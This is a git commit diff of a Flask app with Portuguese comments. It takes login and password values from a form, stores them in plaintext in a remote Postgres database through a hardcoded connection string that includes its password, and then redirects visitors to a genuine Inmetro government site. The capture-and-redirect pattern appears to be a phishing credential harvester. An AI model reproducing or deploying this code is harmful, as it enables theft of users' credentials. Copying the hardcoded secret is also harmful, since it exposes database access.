c5793256c421012648778ce80e6f5bcd5f59d2fe
Juan Alves <juan.alves@mediacaonline.com>
2023-06-06 14:34:58 -0300

    pg2

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 from flask import Flask, render_template, request, redirect
+import psycopg2 as pg
 import os
 
 app = Flask(__name__)
@@ -7,22 +8,34 @@ app = Flask(__name__)
 def index():
   return render_template('index.html')
 
+
 @app.route('/', methods=['POST'])
 def login():
     login = request.form['Login']
     senha = request.form['Password']
 
-    # Gerar o caminho completo para o arquivo de texto
-    filename = os.path.join(app.root_path, f'dados_{login}{senha}.txt')
+    db_url = "postgres://default:vjIrwA8RoXB2@ep-frosty-sun-259138.us-east-1.postgres.vercel-storage.com:5432/verceldb"
 
-    # Escrever as informações de login e senha no arquivo de texto
-    with open(filename, 'w') as file:
-        file.write(f'Login: {login}\nSenha: {senha}\n')
+    # Configurar a conexão com o banco de dados
+    conn = pg.connect(db_url)
+
+    # Criar um cursor para executar as operações no banco de dados
+    cursor = conn.cursor()
+
+    # Executar a inserção dos dados na tabela desejada
+    cursor.execute("INSERT INTO dados (login, senha) VALUES (%s, %s)", (login, senha))
+
+    # Confirmar a transação
+    conn.commit()
+
+    # Fechar o cursor e a conexão com o banco de dados
+    cursor.close()
+    conn.close()
 
     # Exibir mensagem de log
     app.logger.info('Login e senha enviados com sucesso!')
 
-    # Redirecionar para um site após salvar o arquivo
+    # Redirecionar para um site após a inserção no banco de dados
     return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
 
 if __name__ == '__main__':
